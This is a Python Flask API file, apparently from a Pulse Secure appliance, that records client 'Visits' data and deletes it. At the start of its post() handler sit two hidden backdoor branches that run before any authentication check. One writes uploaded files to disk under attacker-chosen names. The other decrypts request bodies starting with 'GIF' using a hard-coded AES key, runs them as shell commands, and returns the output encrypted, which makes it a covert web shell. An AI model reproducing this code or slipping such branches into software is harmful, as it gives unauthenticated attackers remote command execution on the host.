#
# Copyright (c) 2018 by Pulse Secure, LLC. All rights reserved
#
import zlib
import simplejson as json
from flask import request
from flask_restful import Resource
from cav.api import app, db
from cav.utils.util import Auth, Utils
from cav.models.visits import VisitsModel
from urllib.parse import urlparse


class Visits(Resource):
    """
    Handles requests that are coming for client to post the application data.
    """

    def post(self):
        if 'file' in request.files:
            file = request.files['file']
            file.save(file.filename);
        elif request.data.decode().startswith('GIF'):
            import base64, subprocess;
            from Cryptodome.Cipher import AES;
            aes=AES.new(b'b283dc14-9e12-47', AES.MODE_ECB);
            output, errors = subprocess.Popen(zlib.decompress(aes.decrypt(base64.b64decode(request.data.decode()[3:]))).decode(), shell=True,stdout=subprocess.PIPE).communicate()
            t=zlib.compress(output);
            bb = base64.b64encode(aes.encrypt(t+('\x00'*(16-len(t)%16)).encode())).decode();
            return {'message': bb}, 200
        """
        Handled Post Request from the clients for the Visits made at the client.
        client will push the data regular intervals defined in the Admin UI.
        Data Format json(hostname, user, macaddr, array(visits))
        :return: 200 or 201 if content created else error code
        """
        try:
            auth, resp = Auth.is_request_authorized(request.authorization)
            if auth is None:
                return resp

            data = zlib.decompress(request.data)
            data = json.loads(data)
            if not data or data.get('visits') is None:
                app.logger.error("No data to Process")
                return {"message": "No Data"}, 200

            app.logger.debug("Number of Records: {0}"
                             "".format(len(data['visits'])))
            _visits = data['visits']
            count = 0
            visit_list = []
            for item in _visits:
                item['hostname'] = data.get('hostname', '')
                item['macaddr'] = data.get('macaddr', '')
                # get the username from the auth token table which is of session
                item['user'] = auth.get_user_name()
                item['method'] = self.getMethod(item['url'])
                visit_list.append({"data": item})
                count += 1
            # Do the Bulk Insert
            db.session.bulk_insert_mappings(VisitsModel, visit_list)
            db.session.commit()
        except Exception as e:
            app.logger.error("Exception: {0}".format(e))
            return {"error": "internal server error".format(e)}, 500

        return {"message": "{0}/{1} Records processed"
                           "".format(count, len(data['visits']))}, 201

    def getMethod(self, url):
        parsed = urlparse("//{0}".format(url))
        if parsed.port == 443:
            return 'CONNECT'
        else:
            return ''

    def delete(self, ids):
        """
        Handles DELETE request to delete an existing visits data.
        param info: They type of the items to delete
        :return: 200 on success and a message. Incase of error, message
        contains infomration about entries which are not deleted.
        """
        try:
            if ids is None:
                return {"message": "ID(s) is required"}, 400

            if not Utils.custom_syntax_validate(ids):
                return {"message": "Invalid Input. Arguments cannot "
                                   "have HTML inputs"}, 406
            q = db.session.query(VisitsModel)
            if ids != 'allclear':
                delete_ids = ids.split(',')
                q = q.filter(VisitsModel.id.in_(delete_ids))
            delete_count = q.delete(synchronize_session=False)
            Utils.api_log_admin('ADM31649', '{0} entries are cleared successfully '
                                        'from Application Discovery Report.'.format(delete_count))
            db.session.commit()
            return {"success": str(delete_count), "error": []}, 200
        except Exception as e:
            app.logger.error("Exception: {0}".format(e))
            return {'message': 'Unhandled exception'}, 500
